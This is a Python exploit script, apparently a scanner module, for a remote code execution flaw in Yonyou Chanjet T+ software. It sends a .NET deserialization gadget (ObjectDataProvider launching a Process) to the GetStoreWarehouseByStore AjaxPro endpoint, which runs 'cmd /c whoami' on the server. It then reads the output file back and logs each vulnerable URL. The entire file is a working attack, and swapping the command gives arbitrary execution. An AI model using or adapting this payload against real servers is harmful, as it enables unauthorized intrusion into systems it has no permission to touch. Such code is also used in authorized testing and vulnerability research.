import requests
import time
import buter
import wirtefile

filename = "./reps/用友畅捷通T+GetStoreWarehouseByStore_RCE-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "X-Ajaxpro-Method":"GetStoreWarehouseByStore",
        "Content-Type":"application/x-www-form-urlencoded",
    }
headers_comman = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
    }

poc = "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"

data = '''{
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd", "Arguments":"/c whoami > test.txt"
        }
    }
  }
}'''

def yychanjetRCE(url):
    try:
        reps = requests.post(url + poc, headers=headers, data=data, timeout=5, verify=False)
        command_path = requests.get(url + "/tplus/test.txt", headers=headers_comman, timeout=3, verify=False)
        if command_path.status_code == 200 and 'System.ArgumentException' in reps.text and len(command_path.text) <= 30:
            print(buter.colors.GREEN+  f"存在用友畅捷通T+GetStoreWarehouseByStore_RCE url : {url}\nReponse : {command_path.text}" + buter.colors.END)
            reptext = url
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现用友畅捷通T+GetStoreWarehouseByStore_RCE url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
